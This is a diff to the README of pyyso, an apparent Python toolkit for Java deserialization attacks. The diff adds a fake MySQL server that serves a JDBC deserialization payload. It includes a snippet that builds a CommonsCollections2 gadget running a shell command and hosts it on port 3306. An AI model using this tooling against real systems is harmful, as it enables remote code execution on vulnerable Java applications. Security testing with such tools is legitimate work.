@@ -9,7 +9,7 @@ Additionally, it has a goal of becoming the most convenient and reliable toolkit
 Here are just a few of the things that pyyso does well:
 
 - Easy generating of java serialized poc
-- Powerful, flexible functionality to start a LDAP/RMI/JRMP server to host java serialized pocs
+- Powerful, flexible functionality to start a LDAP/RMI/JRMP/MySQL server to host java serialized pocs
 - Communicating and collaborating with other Python packages 
 - Won't be exploited back in RMI like java client
 
@@ -28,6 +28,7 @@ pyyso has implemented
 - high JDK version beanfactory bypass
 - JRMP server
 - JRMPClient Gadget
+- Fake MySQL server for JDBC deserialize
 
 ## Where to get it
 The source code is currently host on GitHub at:
@@ -130,6 +131,17 @@ server.run()
 ```
 
 a registry will listen `0.0.0.0:1099`  and a poc provider server will listen `0.0.0.0:42155`
+
+### MySQL
+
+to start a MySQL server hosts JDBC deserialize payload, use:
+```python
+serobj=pyyso.cc2("open /")
+server=pyyso.MysqlServer(serobj=serobj, ip="0.0.0.0", port=3306)
+server.run()
+```
+
+a fake MySQL server will listen `0.0.0.0:3306`, and wait for `SHOW STATUS`
 
 ## Support Options
 
